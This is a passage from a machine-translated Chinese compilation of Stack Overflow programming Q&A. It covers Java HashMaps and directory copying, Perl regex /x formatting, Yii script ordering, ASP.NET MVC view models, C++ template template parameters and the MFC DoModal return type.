    // //---------------------------------------------------------------------------------------
    public Employee searchByName(String employeeName) {
        Employee employee = map.get(employeeName);
        System.out.println(employee);
        return employee;
    } 
```

用户输入

```
//---------------------------------------------------------------------------------------
//  Name:        userInputByName.
//  Description: This method is used in the MainApp to give the user capability to search by name.
//---------------------------------------------------------------------------------------
    public static Employee userInputByName() 
    {
        // String temp is for some reason needed. If it is not included
        // The code will not execute properly.
        String temp = keyboard.nextLine();
        Employee e = null;
        System.out.println("Please enter the Employee Name:");
        String employeeName = keyboard.nextLine();

        return e = new Employee(employeeName);

    } 
```

添加到哈希图中

```
//---------------------------------------------------------------------------------------
//   Create a Store named Store and add Employee's to the Store.
//---------------------------------------------------------------------------------------
        EmployeeStore Store = new EmployeeStore();
        Store.add(new Employee("James O' Carroll", 18, "hotmail.com"));

        Store.add(new Employee("Andy Carroll", 1171, "yahoo.com"));

        Store.add(new Employee("Luis Suarez", 7, "gmail.com")); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T14:29:57.087

您`Hashmap`的声明为`HashMap<String, Employee> map`.

如果要从中删除某些内容，则需要传入 a `String`，而不是`Employee`. 尝试类似：

```
public Employee remove(String key) 
{
    return map.remove(key);
} 
```

`HashMap`删除之前无需检查是否包含密钥。该方法将为`null`您返回。

编辑：我很惊讶这并没有为您抛出编译时错误。

**编辑2：**好的。因此，您正在创建`Employee`对象，然后将其传递给您的`add()`方法。这很好，但你需要让你的方法与你所做`add()`的方法相匹配。`remove()`因此，如果您正在这样做，`EmployeeStore.remove(<employee.getEmployeeName())`那么您应该使您的`add()`方法如下所示：

```
public Employee add(Employee input)
{
    return map.put(input.getEmployeeName(), input);
} 
```

`Employee`如果之前在 that 下存储了一个对象，则此函数确实会返回一个对象`Key`，但您可以选择忽略该值。拥有`add()`这样的方法应该使其与您的`remove()`方法相匹配。由于您有一个员工 ID 号，您甚至可以将您的 ID 更改`Key`为该整数，因为它可能比名称更独特。

# regex - 我可以在我的代码中将我的 Perl 正则表达式分成多行吗？

> ID：11651856
> 
> 赞同：19
> 
> 时间：2012-07-25T14:17:54.693
> 
> 标签：regex, perl

我只是想知道我是否能够分解我在 Perl 代码中的一个长正则表达式，以便将它写成几行？我只是希望任何可能在完成后查看我的代码的人都保持可读性和紧凑性。我正在寻找类似于在 Perl 中将字符串分成几行的方式的东西。例如：

```
print "This is a string that is ". #1st line
      "very long, so it is on 2 lines!"; #2nd line
# prints = "This is a string that is very long, so it is on 2 lines!" 
```

我不确定如何使用正则表达式执行此操作，因为它不使用引号。如果我按回车，我猜它会在我的正则表达式中添加一个换行符，使其错误。我想做一些类似的事情：

```
if($variable_1 = /abcde_abcde_abdcae_adafdf_      #1st regex line
                 abscd_casdf_asdfd_....asdfaf/){ #regex continued
    # do something
} # regex looking for pattern = abcde_abcde_abdcae_adafdf_abscd_casdf_asdfd_....asdfaf 
```

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-07-25T14:33:28.457

### 使用不区分空格的修饰符

perlre(1) 手册页说：

> “/x”修饰符本身需要更多解释。它告诉正则表达式解析器忽略大多数既不是反斜杠也不是字符类中的空格。您可以使用它来将您的正则表达式分解为（稍微）更具可读性的部分。

您可以使用它来创建多行表达式。例如：

```
/
  abcde_abcde_abdcae_adafdf_    # Have some comments, too. 
  abscd_casdf_asdfd_....asdfaf  # Here's your second line.
/x 
```

### 文字空间

如果您的匹配将包含空格，则需要在使用 /x 修饰符时在正则表达式中明确显示它们。例如，`/foo bar baz quux/x`不会像您期望的那样匹配以空格分隔的字符串。相反，您需要以下内容：

```
print "true\n" if
    /
        foo
        \s+  # You need explicit spaces...
        bar
        \s+  # because the modifier will...
        baz
        \s+  # otherwise ignore literal spaces.
        quux
    /x; 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-07-25T14:21:35.570

是的，请参阅[`/x modifier`](http://perldoc.perl.org/perlre.html#/x)perlre 手册页中的 。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-04T09:55:08.200

使用`+`符号。这是示例：

```
push @steps, $steps[-1] +
        $radial_velocity * $elapsed_time +
        $orbital_velocity * ($phase + $phase_shift) -
        $DRAG_COEFF * $altitude; 
```

# java - java 101，我如何计算传递给main的参数数量？

> ID：11651857
> 
> 赞同：12
> 
> 时间：2012-07-25T14:17:57.717
> 
> 标签：java, count, main, args

例如

```
public static void main(String[] args) {
            int count = 0;
        for (String s: args) {
            System.out.println(s);
                count++;

        }

    } 
```

有没有办法做类似的事情

整数计数 = args.length()？还是 args.size()？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-07-25T14:19:01.057

这将是：

```
int count = args.length; 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-25T14:19:05.580

> 有没有办法做类似的事情
> 
> 整数计数 = args.length()？还是 args.size()？

是的，`args.length`。

没有什么特别的`args`；它是一个规则的`String`对象数组，可以这样对待。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-25T14:19:38.887

所有数组都有一个名为“字段”`length`

```
int count = args.length; 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-07-25T14:20:04.283

```
public static void main(String[] args) {
    System.out.println(args.length);
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-07-25T14:20:09.823

"args" 只是一个数组，所以你可以使用它的长度属性。

像这样：

```
System.out.println(args.length); 
```

你很高兴。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-07-25T14:41:13.920

只需使用
`int length=args.length`

args 只是一个数组，您可以使用它的长度属性。

# php - 从 Yii 中的 registerScript 方法强制脚本顺序

> ID：11651861
> 
> 赞同：7
> 
> 时间：2012-07-25T14:18:11.913
> 
> 标签：php, yii

我创建了一个注册自己的脚本的小部件，如下所示

```
class MyWidget extends CWidget {
    public function run(){
        Yii::app()->clientScript->registerScript(__CLASS__, <<<JAVASCRIPT
var a = "Hello World!";
JAVASCRIPT
        , CClientScript::POS_END);
    }
} 
```

在布局中，我这样调用小部件

```
<?php $this->widget('MyWidget');?>
<?php echo $content;?> 
```

但是在视图文件中，我需要该小部件声明的变量。

```
<?php 
Yii::app()->clientScript->registerScript('script', <<<JAVASCRIPT
    alert(a);
JAVASCRIPT
    , CClientScript::POS_END);
?> 
```

请注意，在两个 registerScript 方法中，我都使用 POS_END 作为脚本位置，因为我打算将所有脚本（包括 CoreScript，例如 jQuery、jQueryUI 等）放在`<body>`标记之后。

问题是渲染的脚本将显示来自视图文件的脚本，然后显示来自小部件的脚本。

```
alert(a);
var a = "Hello World!"; 
```

正如我们所看到的，上面的代码不起作用，所以我需要将第二行放在第一行之上。

关于如何强制订单的任何想法？我可以扩展`CClientScript`（并创建一个新`registerScript`方法），只要所有脚本都将呈现在结束位置，并且我不必将上面的那些内联 Javascript 代码拉到新的包或文件中。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-27T02:10:21.273

所以我终于找到了一个黑客来做到这一点。我扩展了一个新`ClientScript`类并修改了`registerScript`方法，以便它接受另一个参数`$level`。

```
public function registerScript($id, $script, $position = self::POS_END, $level = 1); 
```

就像在 CSS 中`$level`一样`z-index`，除了 is 的数量越大，`$level`脚本的位置就越低。

例如

```
Yii::app()->clientScript->registerScript('script1', '/** SCRIPT #1 **/', CClientScript::POS_END, 1);
Yii::app()->clientScript->registerScript('script2', '/** SCRIPT #2 **/', CClientScript::POS_END, 2);
Yii::app()->clientScript->registerScript('script3', '/** SCRIPT #3 **/', CClientScript::POS_END, 1); 
```

即使`script3`在 之后声明`script2`，在渲染的脚本中，它也会显示在上面，`script2`因为 的`$level`值`script2`大于`script3`'s。

这是我的解决方案的代码。它就像我想要的那样工作，虽然我不确定排列方法是否足够优化。

```
/**
 * ClientScript manages Javascript and CSS.
 */
class ClientScript extends CClientScript {
    public $scriptLevels = array();

    /**
     * Registers a piece of javascript code.
     * @param string $id ID that uniquely identifies this piece of JavaScript code
     * @param string $script the javascript code
     * @param integer $position the position of the JavaScript code.
     * @param integer $level the rendering priority of the JavaScript code in a position.
     * @return CClientScript the CClientScript object itself (to support method chaining, available since version 1.1.5).
     */
    public function registerScript($id, $script, $position = self::POS_END, $level = 1) {
        $this->scriptLevels[$id] = $level;
        return parent::registerScript($id, $script, $position);
    }

    /**
     * Renders the registered scripts.
     * Overriding from CClientScript.
     * @param string $output the existing output that needs to be inserted with script tags
     */
    public function render(&$output) {
        if (!$this->hasScripts)
            return;

        $this->renderCoreScripts();

        if (!empty($this->scriptMap))
            $this->remapScripts();

        $this->unifyScripts();

        //===================================
        //Arranging the priority
        $this->rearrangeLevels();
        //===================================

        $this->renderHead($output);
        if ($this->enableJavaScript) {
            $this->renderBodyBegin($output);
            $this->renderBodyEnd($output);
        }
    }

    /**
     * Rearrange the script levels.
     */
    public function rearrangeLevels() {
        $scriptLevels = $this->scriptLevels;
        foreach ($this->scripts as $position => &$scripts) {
            $newscripts = array();
            $tempscript = array();
            foreach ($scripts as $id => $script) {
                $level = isset($scriptLevels[$id]) ? $scriptLevels[$id] : 1;
                $tempscript[$level][$id] = $script;
            }
            foreach ($tempscript as $s) {
                foreach ($s as $id => $script) {
                    $newscripts[$id] = $script;
                }
            }
            $scripts = $newscripts;
        }
    }
} 
```

所以我只需要将类作为clientScript组件放在配置中

```
'components' => array(
  'clientScript' => array(
      'class' => 'ClientScript'
  )
) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-26T14:54:45.113

我已经为 Yii 提供了一个补丁来允许排序（前置、附加、编号）

你可以在这里找到它 [https://github.com/yiisoft/yii/pull/2263](https://github.com/yiisoft/yii/pull/2263)

如果它没有进入您的位置，那么您可以将 CClientScript 扩展到您自己的类以应用我的更改

但通常正确编写的 JS 应该独立于顺序工作，例如，而不是定义一些全局范围变量，您可以将它们作为属性分配给窗口（访问不存在的属性不会在 js 中引发错误）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-26T05:30:38.590

尝试注册到 HEAD

```
Yii::app()->clientScript->registerScript(__CLASS__, <<<JAVASCRIPT
var a = "Hello World!";
JAVASCRIPT
, CClientScript::POS_HEAD); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-10-19T15:13:10.933

无需扩展 CClienScript。解决此问题的一个简单方法是在控制器中的控制器中创建一个 $script 数组，并将视图脚本添加到该变量中。在您的布局文件中，您将注册存储在 $scripts 数组中的脚本，然后再注册要在其之前呈现的脚本。例如：

**在你的控制器中**

```
public $scripts = []; 
```

**在您的布局中：**

```
$baseURL = Yii::app()->request->baseUrl;
$clientScript = Yii::app()->clientScript;
$clientScript->registerScriptFile( $baseURL . '/js/jquery.min.js', CClientScript::POS_END );
$clientScript->registerScriptFile( $baseURL . '/js/bootstrap.min.js', CClientScript::POS_END); 
```

**在你看来**

```
<?php array_push($this->scripts,"/js/summernote.min.js");?> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-11-06T08:21:01.277

正如@Petra 所说，覆盖CClientScript 类，这是我正在使用的代码，在使用@Petra 代码之后并没有为我解决。

```
class ClientScript extends CClientScript {

public $scriptLevels;

public function registerScript($id, $script, $position = null, $level = 1, array $htmlOptions = array()) {
    $this->scriptLevels[$id] = $level;
    return parent::registerScript($id, $script, $position, $htmlOptions);
}

public function render(&$output) {
    foreach ($this->scripts as $key => $value) {
        $this->scripts[$key] = $this->reorderScripts($value);
    }
    parent::render($output);
}

public function reorderScripts($element) {
    $tempScripts = array();
    $buffer = array();
    foreach ($element as $key => $value) {
        if (isset($this->scriptLevels[$key])) {
            $tempScripts[$this->scriptLevels[$key]][$key] = $value;
        }
    }
    ksort($tempScripts);
    foreach ($tempScripts as $value) {
        foreach ($value as $k => $v) {
            $buffer[$k] = $v;
        }
    }
    return $buffer;
}

} 
```

然后，转到您的配置文件，并在组件部分编辑以下内容：

```
'components' => array(
    .
    .
    'clientScript' => array(
        'class' => 'ClientScript'
    ),
) 
```

# c# - 来自数据库 asp .net mvc4 的下拉列表

> ID：11651867
> 
> 赞同：1
> 
> 时间：2012-07-25T14:18:29.900
> 
> 标签：c#, asp.net-mvc-3, razor

我正在使用asp .net mvc 4。我有一个数据库，其中包含一个**用户表（user_id，password，email）**，另一个用于**角色（role_id，role_description）**，以及一个我称为**user_role（user_id，role_id）**的表包含具有角色的用户列表，我正在使用模型的实体框架。我有一个用于用户帐户设置的控制器，它有 3 个视图，一个用于创建一个用于编辑，一个用于删除一个用户。问题是所有这些视图都是**用户模型的强类型**我想同时更新表角色和表 user_role。我能怎么做？如果你愿意，我可以告诉你更多细节。我想知道是否有一种方法可以显示角色的下拉列表，用户可以从数据库中的现有角色中选择一个角色。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:24:58.087

您应该创建一个 UserViewModel 类，该类将包含特定视图中的所有必需信息，例如将显示在您的下拉列表中的可用角色列表、选定角色等。类似的东西

```
public class UserViewModel
    {
        public int UserId { get; set; }

        public int RoleId { get; set; }

        public List<SelectListItem> Roles { get; set; }

        ...
    } 
```

您的 *.cshtml 文件中的视图标题将如下所示

```
@model Namespace.UserViewModel 
```

将此类设置为您的用户视图的模型并继续。

# java - 从 servlet 调用 applet 的函数来传递数据有什么问题吗？

> ID：11651871
> 
> 赞同：0
> 
> 时间：2012-07-25T14:18:40.670
> 
> 标签：java, jakarta-ee, servlets, applet

我之前问过这个问题，*“我怎样才能让 Servlet 向小程序发送一些数据？”*

[~链接在这里](https://stackoverflow.com/questions/11648577/sending-data-from-a-servlet-to-applet-how-can-i-implement-this)

我得到的回应是，将该数据转换为*常见的传输格式*，例如 xml、csv 或使用序列化。列出的一个优势：

*这些常见的传输格式的优点是有很多 API/库可用于在复杂的 Java 对象和通用传输格式的字符串或输入/输出流之间进行转换，并且所需的代码最少。最后，您只需将其写入 HTTP servlet 响应的输出流，然后将其作为小程序中 URL 连接的输入流进行检索。*

因为没有人提到，所以我想问：***我不能从包含数据的servlet调用applet的函数，并将数据传递给那个applet吗？***

这有什么缺点吗？

这就是我正在做的事情：（*我直接调用applet的函数'func'）*

```
// Snippet from the servlet

gdfd = new GetDataFromDatabase(queryString);
map = gdfd.getResult(); // Get the HashMap object from the bean
new PollForm().func(map); // Send the map object to the applet 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:42:47.843

applet 和 servlet 在不同的计算机上运行。对于一个 servlet 实例（在您的服务器上运行），也可能有多个 applet 实例（在人们的浏览器中运行）。

因此它们不能直接相互调用函数，因为它们除了通过网络连接之外没有连接。

调用`new PollForm()`servlet 会在服务器上创建一个新的小程序实例——这不是很有用，因为没有人可以看到它。

# android - 将视频上传到 Facebook 问题

> ID：11651883
> 
> 赞同：-1
> 
> 时间：2012-07-25T14:19:19.150
> 
> 标签：android

我已经完成了 [上传到 Facebook](https://stackoverflow.com/questions/7279510/upload-video-to-facebook)的帖子，但是我在哪里调用***uploadvideo***的功能..
我还将 facebook sdk 和示例项目导入工作区，请帮助我。如果我将代码复制到其他地方，我已将代码添加到 AsyncFacebookRunner 类中。

这是我复制到 AsyncFacebookRunner 类的代码

```
public  void uploadVideosFacebook(String videoPath) { 
            byte[] data = null;

    String dataMsg = "Video Desc.";
    String dataName="aaaassss.mp4";
    Bundle param;

    AsyncFacebookRunner mAsyncRunner = new   AsyncFacebookRunner(fb);
    InputStream is = null;
    try {
       is = new FileInputStream("/mnt/sdcard/aaaassss.mp4");
       data = readBytes(is); 

       param = new Bundle();
       param.putString("message", dataMsg);
       param.putString("filename", dataName);
       param.putByteArray("video", data);
       mAsyncRunner.request("me/videos", param, "POST", new fbRequestListener(), null);

    } catch (FileNotFoundException e) {
       e.printStackTrace();
    } catch (IOException e) {
       e.printStackTrace();
    }
}

public byte[] readBytes(InputStream inputStream) throws IOException {
      // this dynamically extends to take the bytes you read
      ByteArrayOutputStream byteBuffer = new ByteArrayOutputStream();

      // this is storage overwritten on each iteration with bytes
      int bufferSize = 1024;
      byte[] buffer = new byte[bufferSize];

      // we need to know how may bytes were read to write them to the byteBuffer
      int len = 0;
      while ((len = inputStream.read(buffer)) != -1) {
        byteBuffer.write(buffer, 0, len);
      }

      // and then we can return your byte array.
      return byteBuffer.toByteArray();
}

public class fbRequestListener implements RequestListener {

    @Override
    public void onComplete(String response, Object state) {
        // TODO Auto-generated method stub
        Log.d("RESPONSE",""+response);

    }

    @Override
    public void onIOException(IOException e, Object state) {
        // TODO Auto-generated method stub
        Log.d("RESPONSE",""+e);

    }

    @Override
    public void onFileNotFoundException(FileNotFoundException e,
            Object state) {
        // TODO Auto-generated method stub
        Log.d("RESPONSE",""+e);

    }

    @Override
    public void onMalformedURLException(MalformedURLException e,
            Object state) {
        // TODO Auto-generated method stub

    }

    @Override
    public void onFacebookError(FacebookError e, Object state) {
        // TODO Auto-generated method stub
        Log.d("RESPONSE",""+e);

    }

    } 
```

这就是我调用 onclick 时使用的

```
public void onClick(View v) 
{
                  AsyncFacebookRunner.uploadVideosFacebook("/mnt/sdcard/aaaassss.mp4");
           } 
```

我的疑问是，当我运行此函数时，我会正确调用该函数，我会收到一条错误消息，指出应该将 uploadVideosFacebook 方法转换为静态方法，我认为这是不正确的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:25:08.973

请改用此答案：[是否可以使用 Facebook SDK 将视频从 SD 卡上传到 Facebook？](https://stackoverflow.com/questions/6908413/is-uploading-videos-from-an-sd-card-to-facebook-possible-with-the-facebook-sdk)

基本上，您必须使用带有参数**message、filename**和**data**的 AsyncFacebookRunner 。message是你的视频的短消息，filename是文件的类型（例如：“.mp4”），data是你的视频转换成字节后的内容。

使用 AsyncFacebookRunner 将其发布到“我/视频”。

**参考：[https ://developers.facebook.com/docs/reference/rest/video.upload/](https://developers.facebook.com/docs/reference/rest/video.upload/)**

# c++ - 如何使用函数获得模板模板参数推导？

> ID：11651889
> 
> 赞同：4
> 
> 时间：2012-07-25T14:19:47.823
> 
> 标签：c++, templates

考虑一组函数，例如

```
template< class Fun >
void A( const Fun& )
{
}

template< class Fun >
void B( const Fun& )
{
}

template< class Fun >
void C( const Fun& )
{
} 
```

旨在将函数类型作为参数。然后，这完全没问题：

```
template< class T >
void Func( const T& )
{
}

A( Func< int > );
B( Func< int > );
C( Func< int > ); 
```

现在我想摆脱重复`int`模板参数，所以我尝试了这个：

```
template< class T >
struct Helper
{
  template< template< class > class Fun >
  static void A( Fun< T >& f )
  {
    A( f );
  }

  template< template< class > class Fun >
  static void B( Fun< T >& f )
  {
    B( f );
  }

  ...
};

typedef Helper< int > IntHelper;
IntHelper::A( Func );  //error
IntHelper::B( Func );  //
IntHelper::C( Func );  // 
```

但是这无法在 gcc 4.5.1 ( `'error: no matching function for call to 'Helper<int>::A(<unresolved overloaded function type>)'`) 和 MSVC10 ( `cannot use function template 'void Func(const T &)' as a function argument`and `could not deduce template argument for 'overloaded function type' from 'overloaded function type'`) 上编译。

有人可以确切地解释为什么，有没有办法解决这个问题？

**编辑**好的我明白为什么现在不可能了；对于包含解决方法的答案：在实际代码中有很多不同`Func`的 s，比如 100，而只有大约 6 个函数，如 A、B 和 C ......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T14:28:20.913

`Func`是一个函数模板，所以你不能将它作为值传递给函数。

您也不能将其作为[模板模板参数](https://stackoverflow.com/questions/213761/what-are-some-uses-of-template-template-parameters-in-c)传递，因为模板模板参数必须是类模板（而不是函数模板）。

您*可以*传递包装函数模板的模板模板参数（例如，从静态成员函数返回其实例化）：

```
template<class T> struct FuncHelper {
    static void (*f())(const T &) { return &(Func<T>); }
};
template<typename T>
struct Helper
{
  template< template< class > class Fun >
  static void A()
  {
    A( Fun<T>::f() );
  }
};
Helper<int>::A<FuncHelper>(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-25T14:32:43.340

form `template<class> class Fun`，无论是作为声明还是作为模板模板参数（就像您拥有的那样），都是为*类*模板设计的，但`Func`事实并非如此。这是一个函数模板。那些具有 form `template</*parameters*/> Ret foo(/*parameters*/)`，并且它们不允许作为模板模板参数。

一般来说，函数模板不能像类模板那样被操纵。

在一种情况下，您可以避免传递模板参数的需要：

```
// Deduces that Func<int> is meant
void (*p)(int) = Func; 
```

然后你可以传递`p`给`A`,`B`和`C`。

（同样，如果你有一个函数`void f(void(*p)(int));`，那么调用表单`f(Func)`就可以了。）

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-25T14:42:21.953

虽然可以使用类模板作为模板参数，例如

```
template <typename> class Foo;

template <template <typename> class C> void doit() { /* ...*/ };

doit<Foo>(); 
```

（语义上）不可能使用函数模板作为模板参数（没有“函数模板指针”）。通常的方法是使用函数对象，例如

```
template <typename T>
struct Func
{
  void operator()(T const &) const
  {
     /* ... */
  }
};

template <typename T>
struct helper
{
  template <template <typename> class F>
  static void A()
  {
    A(F<T>);
  }
  // etc
};

typedef helper<int> int_helper;

int_helper::A<Func>(); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-12-31T00:26:13.327

如果`Func`可以声明为带有`auto`类型参数的 lambda（使用[C++14 的通用 lambdas](https://isocpp.org/wiki/faq/cpp14-language#generic-lambdas)），则 、 和 的定义`A`不需要`B`更改`C`，并且可以在无需指定参数类型的情况下调用：

```
auto Func = [](auto const&)
{
};

A(Func);
B(Func);
C(Func); 
```

[现场演示](https://ideone.com/3GGcfI)

# c++ - 覆盖虚函数返回类型不同且不是协变的

> ID：11651892
> 
> 赞同：3
> 
> 时间：2012-07-25T14:19:57.330
> 
> 标签：c++, windows-7, mfc, 64-bit, build-error

我已将我的应用程序从 32 位平台移植到 64 位平台，并遇到了各种构建问题。我几乎解决了所有问题，但遇到了一个我无法弄清楚的错误。

任何人都可以建议解决这个错误吗？

> “错误 61 错误 C2555: 'CICEVisionDlg::DoModal': 覆盖虚函数返回类型不同且与 'CDialog::DoModal' 不协变

`DoModal`覆盖代码：

```
int CICEVisionDlg::DoModal() 
{ 
  int nRet; 
  m_bPopup = TRUE; 
  CEXTDLLState EXTDLLState(m_hResDllModule); 
  nRet = CDialog::DoModal(); 
  m_bPopup = FALSE; 
  return nRet; 
} 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-25T14:25:44.793

`DoModal`is的返回值`INT_PTR`，它只是`int`在 32 位上但`__int64`在 64 位平台上。将覆盖函数的返回值更改为`INT_PTR`，它将在两者上编译。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-25T14:29:18.573

重写虚函数时，必须返回正确的类型，其中“正确”取决于基类的返回类型。

“正确”意味着完全相同的类型，或者仅具有指针和引用返回类型，即“更具体”的类型。如果基类中的函数`Base`返回`X*`，则派生类可以返回一个不同的类型`Y*`，前提是它`Y`是 的派生类`X`。

您的问题是`DoModal`派生类中函数的覆盖与它覆盖的函数`CICEVisionDlg`的返回类型不匹配`CDialog`。它是否*应该*是协变的取决于返回类型——如果它不应该是协变的，那么你可以忽略它，错误意味着“你的函数返回错误的类型！”

# java - 使用 Morphia 更新对象数组

> ID：11651893
> 
> 赞同：0
> 
> 时间：2012-07-25T14:19:59.103
> 
> 标签：java, mongodb, morphia, nosql

嗨！我有这个 JSON 结构：

```
 {
    "author" : "some author"
    "comment" : [{
          "text" : "some text",
          "date" : "some date",
       }, {
           "text" : "some text",
          "date" : "some date",
       }]
} 
```

例如，我需要检查所有评论日期。我写了这段代码：

```
 UpdateOperations<Blog> ops;
    Query<Blog> updateQuery = ds.createQuery(Blog.class).disableValidation().filter("comment.$.date", "some date").enableValidation();

    ops = ds.createUpdateOperations(Blog.class).disableValidation().set("comment.$.text", "new text").enableValidation();
ds.update(updateQuery, ops); 
```

但它不起作用。你能告诉我如何处理吗啡中的对象数组吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:40:41.753

过滤器不应该有`$`您可以使用点符号的运算符。尝试：

```
UpdateOperations<Blog> ops;
Query<Blog> updateQuery = ds.createQuery(Blog.class).field("comment.date").equal("some date");
ops = ds.createUpdateOperations(Blog.class).disableValidation().set("comment.$.text", "new text").enableValidation(); 
```

# java - 如何递归复制整个目录，包括Java中的父文件夹

> ID：11651900
> 
> 赞同：7
> 
> 时间：2012-07-25T14:20:17.467
> 
> 标签：java, directory

我目前正在处理从一个地方到另一个地方的文件夹。它工作正常，但它并没有复制所有其余文件和文件夹所在的原始文件夹。这是我正在使用的代码：

```
public static void copyFolder(File src, File dest) throws IOException {
  if (src.isDirectory()) {
    //if directory not exists, create it
    if (!dest.exists()) {
      dest.mkdir();
    }
    //list all the directory contents
    String files[] = src.list();
    for (String file : files) {
      //construct the src and dest file structure
      File srcFile = new File(src, file);
      File destFile = new File(dest+"\\"+src.getName(), file);
      //recursive copy
      copyFolder(srcFile,destFile);
    }
  } else {
    //if file, then copy it
    //Use bytes stream to support all file types
    InputStream in = new FileInputStream(src);
    OutputStream out = new FileOutputStream(dest); 
    byte[] buffer = new byte[1024];
    int length;
    //copy the file content in bytes 
    while ((length = in.read(buffer)) > 0){
      out.write(buffer, 0, length);
    }
    in.close();
    out.close();
    System.out.println("File copied from " + src + " to " + dest);
  }
} 
```

所以我有文件夹 src`C:\test\mytest\..all folders..`

我想把它复制到`C:\test\myfiles`

但不是让`C:\test\myfiles\mytest\..all folders..`我得到`C:\test\myfiles\..all folders..`

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-25T14:25:48.180

尝试使用[Apache Commons IO](http://commons.apache.org/io/)库中的[copyDirectory(File srcDir, File destDir)](http://commons.apache.org/proper/commons-io/javadocs/api-release/index.html?org/apache/commons/io/package-summary.html)方法。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-09-16T09:31:54.487

[Oracle Docs 上有一个](https://docs.oracle.com/javase/tutorial/displayCode.html?code=https://docs.oracle.com/javase/tutorial/essential/io/examples/Copy.java)[使用 java.nio 复制文件的教程，](https://docs.oracle.com/javase/tutorial/essential/io/copy.html)其中包含递归复制示例代码。它适用于 java se 7+。它使用 Files.walkFileTree 方法，这[可能会在带有 junction points 的 ntfs 上引起一些问题](https://bugs.openjdk.java.net/browse/JDK-8069345)。为避免使用 Files.walkFileTree，可能的解决方案如下所示：

```
public static void copyFileOrFolder(File source, File dest, CopyOption...  options) throws IOException {
    if (source.isDirectory())
        copyFolder(source, dest, options);
    else {
        ensureParentFolder(dest);
        copyFile(source, dest, options);
    }
}

private static void copyFolder(File source, File dest, CopyOption... options) throws IOException {
    if (!dest.exists())
        dest.mkdirs();
    File[] contents = source.listFiles();
    if (contents != null) {
        for (File f : contents) {
            File newFile = new File(dest.getAbsolutePath() + File.separator + f.getName());
            if (f.isDirectory())
                copyFolder(f, newFile, options);
            else
                copyFile(f, newFile, options);
        }
    }
}

private static void copyFile(File source, File dest, CopyOption... options) throws IOException {
    Files.copy(source.toPath(), dest.toPath(), options);
}

private static void ensureParentFolder(File file) {
    File parent = file.getParentFile();
    if (parent != null && !parent.exists())
        parent.mkdirs();
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-25T14:26:17.667

您也可以尝试使用[Apache FileUtils](http://commons.apache.org/io/api-release/org/apache/commons/io/FileUtils.html)来复制目录

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-07-25T14:26:35.977

你应该试试[apache commons FileUtils](http://commons.apache.org/io/api-release/org/apache/commons/io/FileUtils.html#copyDirectory%28java.io.File,%20java.io.File%29)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-03-18T09:07:33.187

使用 java.nio：

```
import java.io.IOException;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;

public static void copy(String sourceDir, String targetDir) throws IOException {

    abstract class MyFileVisitor implements FileVisitor<Path> {
        boolean isFirst = true;
        Path ptr;
    }

    MyFileVisitor copyVisitor = new MyFileVisitor() {

        @Override
        public FileVisitResult preVisitDirectory(Path dir, BasicFileAttributes attrs) throws IOException {
            // Move ptr forward
            if (!isFirst) {
                // .. but not for the first time since ptr is already in there
                Path target = ptr.resolve(dir.getName(dir.getNameCount() - 1));
                ptr = target;
            }
            Files.copy(dir, ptr, StandardCopyOption.COPY_ATTRIBUTES);
            isFirst = false;
            return FileVisitResult.CONTINUE;
        }

        @Override
        public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
            Path target = ptr.resolve(file.getFileName());
            Files.copy(file, target, StandardCopyOption.COPY_ATTRIBUTES);
            return FileVisitResult.CONTINUE;
        }

        @Override
        public FileVisitResult visitFileFailed(Path file, IOException exc) throws IOException {
            throw exc;
        }

        @Override
        public FileVisitResult postVisitDirectory(Path dir, IOException exc) throws IOException {
            Path target = ptr.getParent();
            // Move ptr backwards
            ptr = target;
            return FileVisitResult.CONTINUE;
        }
    };

    copyVisitor.ptr = Paths.get(targetDir);
    Files.walkFileTree(Paths.get(sourceDir), copyVisitor);
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2020-06-16T14:25:47.207

该解决方案非常简单，但不是独立于平台的，因为命令是以纯文本形式提供给操作系统的。（此示例适用于基于 Unix 的 shell，对于 Windows，该命令看起来会有所不同`cp`，称为`copy`）。

```
String source = "/user/.../testDir";
String destination = "/Library/.../testDestination/testDir";
String command = "cp -r " + source + " " + destination;
Process p;
try {
    p = Runtime.getRuntime().exec(command);
    p.waitFor();
} catch (InterruptedException | IOException e) {
    // Error handling
} 
```

如果要将对象复制到具有相同名称的子文件夹中，请将其添加到目标路径中，否则只需将其省略，则文件夹内容将直接复制到目标路径中。

编辑：刚刚发现不幸的是这个解决方案不适用于网络驱动器。我不知道原因（但我承认我没有出于任何原因进行挖掘）

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2016-05-06T15:34:41.987

